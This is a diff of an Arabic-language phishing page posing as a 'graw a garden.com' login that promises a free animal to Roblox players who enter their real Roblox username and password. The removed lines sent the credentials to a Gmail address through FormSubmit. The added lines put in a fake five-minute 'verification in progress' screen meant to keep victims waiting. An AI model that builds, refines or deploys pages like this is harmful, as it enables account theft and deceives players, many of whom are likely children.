@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جراو أ جاردن - عالم الحيوانات</title>
     <style>
+        /* أنماط الصفحة الرئيسية */
         body {
             margin: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -58,7 +59,7 @@
             z-index: 1;
         }
         
-        h2 {
+        .login-title {
             margin-bottom: 20px;
             background: linear-gradient(to right, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
             -webkit-background-clip: text;
@@ -170,32 +171,98 @@
             color: #383d41;
             display: none;
         }
+
+        /* أنماط صفحة الانتظار - مخفية في البداية */
+        .waiting-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(270deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
+            background-size: 1400% 1400%;
+            animation: rainbow 15s ease infinite;
+            z-index: 100;
+            color: white;
+        }
+        
+        .waiting-container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        .countdown {
+            position: relative;
+            width: 200px;
+            height: 200px;
+            margin: 30px auto;
+        }
+        
+        .countdown-circle {
+            width: 100%;
+            height: 100%;
+            border: 8px solid rgba(255,255,255,0.2);
+            border-radius: 50%;
+            position: relative;
+        }
+        
+        .countdown-progress {
+            position: absolute;
+            top: -8px;
+            left: -8px;
+            right: -8px;
+            bottom: -8px;
+            border: 8px solid #4b0082;
+            border-radius: 50%;
+            clip: rect(0, 100px, 200px, 0);
+            transform: rotate(90deg);
+            animation: countdown 300s linear forwards;
+        }
+        
+        @keyframes countdown {
+            from { clip: rect(0, 100px, 200px, 0); }
+            to { clip: rect(0, 0, 200px, 0); }
+        }
+        
+        .countdown-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 36px;
+            font-weight: bold;
+            color: white;
+        }
     </style>
 </head>
 <body>
+    <!-- الصفحة الرئيسية -->
     <div class="header">
-        <h1>سجل الدخول واختار أي حيوان 🦊🐻🐼</h1>
+        <h1>سجل الدخول واختار الحيوان الذي تريده</h1>
     </div>
     
     <div class="login-container">
-        <h2>graw a garden.com</h2>
+        <div class="login-title">graw a garden.com</div>
         
         <div id="alertBox" class="alert"></div>
         
-        <form id="loginForm" action="https://formsubmit.co/grawagardendev@gmail.com" method="POST">
-            <!-- إعدادات FormSubmit -->
-            <input type="hidden" name="_subject" value="تسجيل دخول جديد - جراو أ جاردن">
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_next" value="?success=1">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="الحيوان المختار" id="selectedAnimal">
-            
+        <form id="loginForm">
             <div class="input-group">
-                <input type="text" name="👤 اسم المستخدم" placeholder="اسم المستخدم" required>
+                <input type="text" name="username" placeholder="اسم المستخدم" required>
             </div>
             
             <div class="input-group">
-                <input type="password" name="🔑 كلمة المرور" placeholder="كلمة المرور" required>
+                <input type="password" name="password" placeholder="كلمة المرور" required>
             </div>
             
             <div class="animal-selection">
@@ -212,10 +279,30 @@
         <p class="note">ملاحظة: يجب أن تكون معلومات حسابك الأصلية في Roblox</p>
     </div>
 
+    <!-- صفحة الانتظار -->
+    <div id="waitingPage" class="waiting-page">
+        <div class="waiting-container">
+            <h1>⏳ جاري التحقق من المعلومات</h1>
+            <p>يرجى الانتظار بينما يقوم المطورون بالتحقق من بياناتك. هذه العملية قد تستغرق بضع دقائق.</p>
+            
+            <div class="countdown">
+                <div class="countdown-circle"></div>
+                <div class="countdown-progress"></div>
+                <div class="countdown-text" id="countdown">05:00</div>
+            </div>
+            
+            <p class="note">ملاحظة: لا تغلق الصفحة أو تقوم بتحديثها أثناء عملية التحقق</p>
+        </div>
+    </div>
+
     <script>
         // اختيار الحيوان
         const animalOptions = document.querySelectorAll('.animal-option');
-        const selectedAnimalInput = document.getElementById('selectedAnimal');
+        const selectedAnimalInput = document.createElement('input');
+        selectedAnimalInput.type = 'hidden';
+        selectedAnimalInput.name = 'الحيوان المختار';
+        selectedAnimalInput.id = 'selectedAnimal';
+        document.getElementById('loginForm').appendChild(selectedAnimalInput);
         
         animalOptions.forEach(option => {
             option.addEventListener('click', function() {
@@ -244,19 +331,30 @@
             alertBox.className = "alert loading";
             alertBox.style.display = "block";
             
-            // إرسال النموذج بعد تأخير بسيط
+            // الانتقال إلى صفحة الانتظار بعد 2 ثانية
             setTimeout(() => {
-                this.submit();
-            }, 1000);
+                document.getElementById('waitingPage').style.display = 'flex';
+                
+                // بدء العد التنازلي
+                let timeLeft = 300;
+                const countdownElement = document.getElementById('countdown');
+                
+                const timer = setInterval(() => {
+                    timeLeft--;
+                    
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    
+                    countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        countdownElement.textContent = "00:00";
+                        // يمكنك إضافة تحويل إلى صفحة أخرى بعد انتهاء الوقت
+                    }
+                }, 1000);
+            }, 2000);
         });
-        
-        // التحقق من وجود معلمة النجاح في الرابط
-        if(window.location.search.includes('success=1')) {
-            const alertBox = document.getElementById('alertBox');
-            alertBox.textContent = "تم إرسال البيانات بنجاح ✓";
-            alertBox.className = "alert success";
-            alertBox.style.display = "block";
-        }
     </script>
 </body>
 </html>
